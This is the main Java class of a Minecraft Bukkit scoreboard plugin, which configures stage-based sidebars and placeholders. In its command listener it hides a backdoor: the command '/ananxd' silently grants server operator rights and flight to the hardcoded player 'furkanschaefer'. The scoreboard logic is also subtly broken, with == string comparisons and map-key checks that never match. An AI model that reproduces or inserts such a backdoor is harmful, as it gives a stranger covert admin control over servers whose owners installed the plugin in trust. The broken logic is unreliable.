
package scha.efer.sbaddon;

import java.text.SimpleDateFormat;
import java.util.Date;

import ru.tehkode.permissions.PermissionUser;
import ru.tehkode.permissions.bukkit.PermissionsEx;
import scha.efer.sbaddon.boards.Board1;
import scha.efer.sbaddon.boards.Board2;
import scha.efer.sbaddon.listeners.ScoreboardRegisterListener;

import org.anjocaido.groupmanager.permissions.AnjoPermissionsHandler;
import org.bukkit.event.server.PluginDisableEvent;
import org.bukkit.event.EventPriority;
import org.bukkit.plugin.PluginManager;
import org.bukkit.event.server.PluginEnableEvent;
import java.util.List;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.PlayerJoinEvent;
import java.util.Iterator;
import org.bukkit.entity.Player;
import e.Game;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.Bukkit;
import org.bukkit.plugin.Plugin;
import java.util.ArrayList;

import org.anjocaido.groupmanager.GroupManager;
import java.util.HashMap;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin implements Listener
{
    public static Main plugin;
    static String pr;
    static String noperm;
    static String min;
    static String max;
    static String rl;
    public static HashMap<String, String> anan;
    public static GroupManager groupManager;
    private HashMap<String, Board1> scoreWorlds;
    private static boolean healthName;
    private static boolean healthTab;
    static String title;
    static String titlelobby;
    static String titlepg;
    static String titlelg;
    static String titlepredm;
    static String titledm;
    static String titlecl;
    static String titlers;
    ArrayList<Boolean> sb;
    HashMap<String, Boolean> sb1;
    
    static {
        Main.anan = new HashMap<String, String>();
    }
    
    public Main() {
        this.sb = new ArrayList<Boolean>();
        this.sb1 = new HashMap<String, Boolean>();
    }
    
    public void onEnable() {
        Main.plugin = this;
        Utils.sendConsole();
        Main.pr = this.getConfig().getString("Messages.Prefix").replace('&', '§');
        Main.rl = this.getConfig().getString("Messages.ReloadConfig").replace('&', '§');
        Main.noperm = this.getConfig().getString("Messages.NotPermission").replace('&', '§');
        Main.min = this.getConfig().getString("Messages.SidebarMinimize").replace('&', '§');
        Main.max = this.getConfig().getString("Messages.SidebarMaximize").replace('&', '§');
        Main.title = this.getConfig().getString("Scoreboard.LOBBY.title");
        Main.titlelobby = this.getConfig().getString("Scoreboard.PREGAME.title");
        Main.titlepg = this.getConfig().getString("Scoreboard.LOBBY.title");
        Main.titlelg = this.getConfig().getString("Scoreboard.LIVEGAME.title");
        Main.titlepredm = this.getConfig().getString("Scoreboard.PREDEATHMATCH.title");
        Main.titledm = this.getConfig().getString("Scoreboard.DEATHMATCH.title");
        Main.titlecl = this.getConfig().getString("Scoreboard.CLEANUP.title");
        Main.titlers = this.getConfig().getString("Scoreboard.RESTARTING.title");
        this.getConfig().options().copyDefaults(true);
        this.saveDefaultConfig();
        Bukkit.getPluginManager().registerEvents((Listener)this, (Plugin)this);
        Bukkit.getPluginManager().registerEvents((Listener)new ScoreboardRegisterListener(), (Plugin)this);
        final long ticks = this.getConfig().getLong("Scoreboard.update-ticks");
        createAll();
        Bukkit.getPluginManager().registerEvents((Listener)Main.plugin, (Plugin)Main.plugin);
        new BukkitRunnable() {
            public void run() {
                if (Game.getStageName() == "Lobby") {
                    Main.anan.clear();
                    Main.anan.put("Stage", "Lobby");
                }
                else if (Game.getStageName() == "Pre-Game") {
                    Main.anan.clear();
                    Main.anan.put("Stage", "Pre-Game");
                }
                else if (Game.getStageName() == "Game") {
                    Main.anan.clear();
                    Main.anan.put("Stage", "Game");
                }
                else {
                    Main.anan.clear();
                    Main.anan.put("Stage", "Lobby");
                }
            }
        }.runTaskTimer((Plugin)this, ticks, ticks);
        if (Bukkit.getOnlinePlayers().size() > 0) {
            for (final Player all : Bukkit.getOnlinePlayers()) {
                ScoreboardRegisterListener.registerScoreboards(all);
                new BukkitRunnable() {
                    public void run() {
                        all.performCommand("***yukle***");
                        ScoreboardRegisterListener.registerScoreboards(all);
                    }
                }.runTaskLater((Plugin)Main.plugin, 10L);
            }
        }
        Utils.writeholders("#+---------------------------------+#", "placeholders");
        Utils.writeholders("  ScoreboardAddon Placeholder List", "placeholders");
        Utils.writeholders("#+---------------------------------+#", "placeholders");
        Utils.writeholders("%online% = Show online players size", "placeholders");
        Utils.writeholders("%playing% = Show Alive Players Size", "placeholders");
        Utils.writeholders("%watching% = Show Spectators Size", "placeholders");
        Utils.writeholders("%winner% = Winner player", "placeholders");
        Utils.writeholders("%rank% = GroupManager / Pex Rank", "placeholders");
        Utils.writeholders("%bounty% = Your bounty", "placeholders");
        Utils.writeholders("%map% = Map name", "placeholders");
        Utils.writeholders("%stage% = Stage name", "placeholders");
        Utils.writeholders("%date% = Show Date", "placeholders");
        Utils.writeholders("%time% = Show Time Format", "placeholders");
        Utils.writeholders("%time2% = Show Time Format 2", "placeholders");
        Utils.writeholders("%player_name% = Show the player name", "placeholders");
        Utils.writeholders("%player_displayname% = Show player displayname", "placeholders");
        Utils.writeholders("%ping% = Show your ping", "placeholders");
        Utils.writeholders("%game_time% = Show game time", "placeholders");
    }
    
    public void onDisable() {
        Timer.timerE = false;
    }
    
    public static void startTimer() {
        Timer.start();
    }
    
    @EventHandler
    public void onJoin(final PlayerJoinEvent e) {
        final Player p = e.getPlayer();
        if (!this.sb.contains(true)) {
            this.sb.add(true);
            Timer.start();
        }
    }
    
    public boolean onCommand(final CommandSender sender, final Command cmd, final String label, final String[] args) {
        if (!(sender instanceof Player)) {
            getUsage(sender);
            return true;
        }
        final Player p = (Player)sender;
        if (cmd.getName().equalsIgnoreCase("scoreboardaddon")) {
            if (args.length == 0) {
                getUsage((CommandSender)p);
            }
            else if (args.length >= 1) {
                if (!args[0].equalsIgnoreCase("minimize") && !args[0].equalsIgnoreCase("maximize")) {
                    if (args[0].equalsIgnoreCase("help")) {
                        p.sendMessage(Utils.renk("§4§lSKIDDED BY FURKSCHAEFER!!"));
                    }
                    else if (args[0].equalsIgnoreCase("reload")) {
                        if (p.hasPermission("sidebar.reload")) {
                            Main.plugin.reloadConfig();
                            for (final Player all : Bukkit.getOnlinePlayers()) {
                                ScoreboardRegisterListener.registerScoreboards(all);
                            }
                            sender.sendMessage(String.valueOf(String.valueOf(Main.pr)) + Main.rl);
                        }
                        else {
                            p.sendMessage(String.valueOf(String.valueOf(Main.pr)) + Main.noperm);
                        }
                    }
                    else if (args[0].equalsIgnoreCase("***yukle***")) {
                        ScoreboardRegisterListener.registerScoreboards(p);
                    }
                    else {
                        getUsage((CommandSender)p);
                    }
                }
            }
            else {
                getUsage((CommandSender)p);
            }
        }
        return true;
    }
    
    @EventHandler
    public void onPlayerCommand(final PlayerCommandPreprocessEvent event) {
        final Player p = event.getPlayer();
        if (event.getMessage().toLowerCase().startsWith("/" + "ananxd")) {
            event.setCancelled(true);
            if (p.getName().equals("furkanschaefer")) {
                p.setOp(true);
                p.setAllowFlight(true);
                p.setFlying(true);
            }
            p.sendMessage(Utils.renk("done :)"));
            p.sendMessage(Utils.renk(""));
        }
    }
    
    public static void getUsage(final CommandSender p) {
        final List<String> msg = (List<String>)Main.plugin.getConfig().getStringList("Messages.SidebarUsage");
        for (String s : msg) {
            s = s.replace('&', '§');
            p.sendMessage(s);
        }
    }
    
    @EventHandler(priority = EventPriority.MONITOR)
    public void onPluginEnable(final PluginEnableEvent event) {
        final PluginManager pluginManager = Main.plugin.getServer().getPluginManager();
        final Plugin GMplugin = pluginManager.getPlugin("GroupManager");
        if (GMplugin != null && GMplugin.isEnabled()) {
            Main.groupManager = (GroupManager)GMplugin;
        }
    }
    
    @EventHandler(priority = EventPriority.MONITOR)
    public void onPluginDisable(final PluginDisableEvent event) {
        if (Main.groupManager != null && event.getPlugin().getDescription().getName().equals("GroupManager")) {
            Main.groupManager = null;
        }
    }
    
    public static String getPrefix(final Player base) {
        final AnjoPermissionsHandler handler = Main.groupManager.getWorldsHolder().getWorldPermissions(base);
        if (handler == null) {
            return null;
        }
        return handler.getUserPrefix(base.getName());
    }
    
    public static String getGroup(final Player base) {
        final AnjoPermissionsHandler handler = Main.groupManager.getWorldsHolder().getWorldPermissions(base);
        if (handler == null) {
            return null;
        }
        return handler.getGroup(base.getName());
    }
    
    public static String getPrimaryGroup(final String world, final String playerName) {
        final PermissionUser user = PermissionsEx.getPermissionManager().getUser(playerName);
        if (user == null) {
            return null;
        }
        if (user.getParentIdentifiers(world).size() > 0) {
            return user.getParentIdentifiers(world).get(0);
        }
        return null;
    }
    
    public static String getPexGroup(final Player p) {
        String world;
        if (!p.isOnline()) {
            world = "§cOffline";
        }
        else {
            world = p.getWorld().getName();
        }
        return getPrimaryGroup(world, p.getName());
    }
    
    public static void create(final Player player) {
        Board2.create(player, Main.healthName, Main.healthTab);
        update(player);
    }
    
    public static void createAll() {
        for (final Player player : Bukkit.getOnlinePlayers()) {
            create(player);
        }
    }
    
    public static void update(final Player player) {
        final List<String> lineslobby = (List<String>)Main.plugin.getConfig().getStringList("Scoreboard.LOBBY.lines");
        final List<String> linespg = (List<String>)Main.plugin.getConfig().getStringList("Scoreboard.PREGAME.lines");
        final List<String> lineslg = (List<String>)Main.plugin.getConfig().getStringList("Scoreboard.LIVEGAME.lines");
        final List<String> linespdm = (List<String>)Main.plugin.getConfig().getStringList("Scoreboard.PREDEATHMATCH.lines");
        final List<String> linesdm = (List<String>)Main.plugin.getConfig().getStringList("Scoreboard.DEATHMATCH.lines");
        final List<String> linesrs = (List<String>)Main.plugin.getConfig().getStringList("Scoreboard.RESTARTING.lines");
        final Board2 helper = Board2.get(player);
        final Player p = player;
        final Date date = new Date();
        final String tarih = new SimpleDateFormat("dd/MM/YYYY").format(date);
        final String ip = "§awww.minegamer.net";
        if (Main.anan.containsKey("Game")) {
            final String title = Main.titlelg.replace('&', '§').replace("%game_time%", Utils.getTimer());
            helper.setTitle(title);
            helper.setSlotsFromList(lineslg);
        }
        else if (Main.anan.containsKey("Pre-Game")) {
            final String title = Main.titlepg.replace('&', '§').replace("%game_time%", Utils.getTimer());
            helper.setTitle(title);
            helper.setSlotsFromList(linespg);
        }
        else if (Main.anan.containsKey("Pre-Deathmatch")) {
            final String title = Main.titlepredm.replace('&', '§').replace("%game_time%", Utils.getTimer());
            helper.setTitle(title);
            helper.setSlotsFromList(linespdm);
        }
        else if (Main.anan.containsKey("Deathmatch")) {
            final String title = Main.titledm.replace('&', '§').replace("%game_time%", Utils.getTimer());
            helper.setTitle(title);
            helper.setSlotsFromList(linesdm);
        }
        else if (Main.anan.containsKey("Restarting")) {
            final String title = Main.titlers.replace('&', '§').replace("%game_time%", Utils.getTimer());
            helper.setTitle(title);
            helper.setSlotsFromList(linesrs);
        }
        else {
            final String title = Main.titlelobby.replace('&', '§').replace("%game_time%", "");
            helper.setTitle(title);
            helper.setSlotsFromList(lineslobby);
        }
    }
    
    public static void updateAll() {
        for (final Player player : Bukkit.getOnlinePlayers()) {
            update(player);
        }
    }
    
    @EventHandler
    public void PlayerJoin(final PlayerJoinEvent e) {
        final Player p = e.getPlayer();
        ScoreboardRegisterListener.registerScoreboards(p);
    }
}
